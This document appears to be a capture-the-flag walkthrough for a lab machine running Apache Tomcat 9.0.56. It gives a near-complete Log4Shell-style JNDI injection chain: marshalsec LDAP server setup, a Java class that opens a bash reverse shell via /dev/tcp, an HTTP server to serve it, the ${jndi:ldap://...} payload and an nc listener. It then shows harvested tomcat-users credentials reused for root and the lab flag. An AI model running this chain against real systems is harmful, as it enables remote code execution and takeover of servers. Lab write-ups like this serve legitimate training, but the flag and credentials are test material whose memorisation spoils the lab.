Scan : 

```sh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c1c1b4297485c9be409852fe7228bb76 (RSA)
|   256 e2bd0b90770c51fc9de4a6da794bdd96 (ECDSA)
|_  256 e8bae65c69921d2ee53f86a4bbfa7de2 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.56
|_http-title: Apache Tomcat/9.0.56
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- Set Up a Malicious LDAP Server

You can use tools like marshalsec to set up an LDAP server that will return a malicious Java class file.
```
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
```

- Compile the project:

```sh
mvn clean package -DskipTests
```

Run the LDAP server:

```sh
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your-server.com:8888/#Exploit"
```

- Create a Malicious Java Class for Reverse Shell

```java

import java.io.IOException;

public class Exploit {
    static {
        try {
            String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/your-ip/your-port 0>&1"};
            java.lang.Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

- Compile this class:

```sh
javac -source 1.8 -target 1.8 Exploit.java
```
- Start a simple HTTP server to serve this class
```sh
python3 -m http.server 8888
```
- Trigger the Vulnerability

Send a payload to the vulnerable application that triggers the LDAP lookup. This payload will point to your malicious LDAP server, which in turn will instruct the application to load the malicious class file from your HTTP server.

- Payload:

```
 ${jndi:ldap://your-server.com:1389/a}
```

- Start a Listener for the Reverse Shell

```sh
nc -lvnp your-port
```

User:
- After the foot hold we grab that file : 
```sh
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
  <user username="admin" password="H2RR3rGDrbAnPxWa" roles="manager-gui"/>
  <user username="robot" password="H2RR3rGDrbAnPxWa" roles="manager-script"/>

</tomcat-users>
```

- su root  gg you got the flag ;)

Root:VL{25da7f42f4e279698c91c0ce911d51a9}
